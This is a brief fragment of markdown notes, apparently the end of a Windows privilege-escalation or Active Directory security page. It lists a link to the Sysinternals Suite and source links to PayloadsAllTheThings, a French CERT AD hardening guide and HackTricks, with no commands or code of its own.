* [Windows Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)



## Sources
[payloadsAllTheThings](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[CIRT FR point de controle AD](https://www.cert.ssi.gouv.fr/dur/CERTFR-2020-DUR-001/)

[Hacktricks](https://book.hacktricks.xyz/)
